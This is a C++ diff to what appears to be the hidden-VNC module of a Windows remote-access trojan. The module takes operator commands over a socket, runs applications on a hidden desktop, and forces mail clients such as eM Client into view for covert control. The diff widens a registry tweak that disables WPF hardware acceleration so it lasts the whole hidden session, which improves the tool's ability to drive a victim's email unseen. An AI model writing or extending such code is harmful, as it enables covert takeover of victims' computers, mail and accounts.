@@ -76,6 +76,9 @@ static const uint32_t FRAME_FORMAT_JPEG_DIRTY_COMPRESSED = 4;
 
 static atomic_bool g_captureRunning(false);
 static atomic<DWORD> g_spawnedMailClientPid(0);
+static DWORD g_originalWpfHwAccel = 0;
+static bool g_hasOriginalWpfHwAccel = false;
+static bool g_wpfHwAccelPatched = false;
 static thread g_captureThread;
 static mutex g_captureMutex;
 static mutex g_sendMutex;
@@ -981,19 +984,15 @@ static void capture_loop() {
                 }
 
                 if (isMailClient) {
-                    wchar_t className[256] = {0};
-                    GetClassNameW(hwnd, className, 256);
-                    if (wcsncmp(className, L"HwndWrapper", 11) == 0) {
-                        LONG style = GetWindowLongW(hwnd, GWL_STYLE);
-                        if ((style & WS_CAPTION) && (style & WS_SYSMENU)) {
-                            if (IsIconic(hwnd)) {
-                                ShowWindow(hwnd, SW_RESTORE);
-                                SetForegroundWindow(hwnd);
-                            } else if (!IsWindowVisible(hwnd)) {
-                                ShowWindow(hwnd, SW_SHOW);
-                                ShowWindow(hwnd, SW_RESTORE);
-                                SetForegroundWindow(hwnd);
-                            }
+                    LONG style = GetWindowLongW(hwnd, GWL_STYLE);
+                    if ((style & WS_CAPTION) && (style & WS_SYSMENU)) {
+                        if (IsIconic(hwnd)) {
+                            ShowWindow(hwnd, SW_RESTORE);
+                            SetForegroundWindow(hwnd);
+                        } else if (!IsWindowVisible(hwnd)) {
+                            ShowWindow(hwnd, SW_SHOW);
+                            ShowWindow(hwnd, SW_RESTORE);
+                            SetForegroundWindow(hwnd);
                         }
                     }
                 }
@@ -2134,6 +2133,22 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
         initialize_visual_styles();
 
         if (action == "hvnc_start") {
+            // Set Avalon.Graphics DisableHWAcceleration to 1 for the whole VNC session to support WPF apps (eM Client, etc.)
+            HKEY hKeyWpf = NULL;
+            if (RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Avalon.Graphics", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKeyWpf, NULL) == ERROR_SUCCESS) {
+                DWORD dwType = 0;
+                DWORD dwSize = sizeof(DWORD);
+                if (RegQueryValueExW(hKeyWpf, L"DisableHWAcceleration", NULL, &dwType, (LPBYTE)&g_originalWpfHwAccel, &dwSize) == ERROR_SUCCESS) {
+                    g_hasOriginalWpfHwAccel = true;
+                } else {
+                    g_hasOriginalWpfHwAccel = false;
+                }
+                DWORD disableVal = 1;
+                RegSetValueExW(hKeyWpf, L"DisableHWAcceleration", 0, REG_DWORD, (const BYTE*)&disableVal, sizeof(DWORD));
+                g_wpfHwAccelPatched = true;
+                RegCloseKey(hKeyWpf);
+            }
+
             g_scalePercent = cmd.value("quality", 50);
             if (g_scalePercent < 10) g_scalePercent = 10;
             if (g_scalePercent > 100) g_scalePercent = 100;
@@ -2190,6 +2205,19 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             {
                 lock_guard<mutex> lock(g_inputMutex);
                 g_inputQueue.clear();
+            }
+
+            if (g_wpfHwAccelPatched) {
+                HKEY hKeyWpf = NULL;
+                if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Avalon.Graphics", 0, KEY_ALL_ACCESS, &hKeyWpf) == ERROR_SUCCESS) {
+                    if (g_hasOriginalWpfHwAccel) {
+                        RegSetValueExW(hKeyWpf, L"DisableHWAcceleration", 0, REG_DWORD, (const BYTE*)&g_originalWpfHwAccel, sizeof(DWORD));
+                    } else {
+                        RegDeleteValueW(hKeyWpf, L"DisableHWAcceleration");
+                    }
+                    RegCloseKey(hKeyWpf);
+                }
+                g_wpfHwAccelPatched = false;
             }
         } else if (action == "hvnc_quality") {
             lock_guard<mutex> lock(g_captureMutex);
@@ -2525,22 +2553,6 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         SetThreadDesktop(g_hHiddenDesktop);
                     }
 
-                    // Disable hardware acceleration for WPF (eM Client) on the hidden desktop
-                    DWORD originalWpfHwAccel = 0;
-                    bool hasOriginalWpfHwAccel = false;
-                    HKEY hKeyWpf = NULL;
-                    if (wRequestedPath == L"eM Client") {
-                        if (RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Avalon.Graphics", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKeyWpf, NULL) == ERROR_SUCCESS) {
-                            DWORD dwType = 0;
-                            DWORD dwSize = sizeof(DWORD);
-                            if (RegQueryValueExW(hKeyWpf, L"DisableHWAcceleration", NULL, &dwType, (LPBYTE)&originalWpfHwAccel, &dwSize) == ERROR_SUCCESS) {
-                                hasOriginalWpfHwAccel = true;
-                            }
-                            DWORD disableVal = 1;
-                            RegSetValueExW(hKeyWpf, L"DisableHWAcceleration", 0, REG_DWORD, (const BYTE*)&disableVal, sizeof(DWORD));
-                        }
-                    }
-
                     if (isGecko) {
                         SetEnvironmentVariableW(L"MOZ_FORCE_DISABLE_HARDWARE_ACCELERATION", L"1");
                         SetEnvironmentVariableW(L"MOZ_WEBRENDER", L"software");
@@ -2562,15 +2574,6 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     if (isGecko) {
                         SetEnvironmentVariableW(L"MOZ_FORCE_DISABLE_HARDWARE_ACCELERATION", NULL);
                         SetEnvironmentVariableW(L"MOZ_WEBRENDER", NULL);
-                    }
-
-                    if (hKeyWpf) {
-                        if (hasOriginalWpfHwAccel) {
-                            RegSetValueExW(hKeyWpf, L"DisableHWAcceleration", 0, REG_DWORD, (const BYTE*)&originalWpfHwAccel, sizeof(DWORD));
-                        } else {
-                            RegDeleteValueW(hKeyWpf, L"DisableHWAcceleration");
-                        }
-                        RegCloseKey(hKeyWpf);
                     }
 
                     if (hCurrentDesktop) {
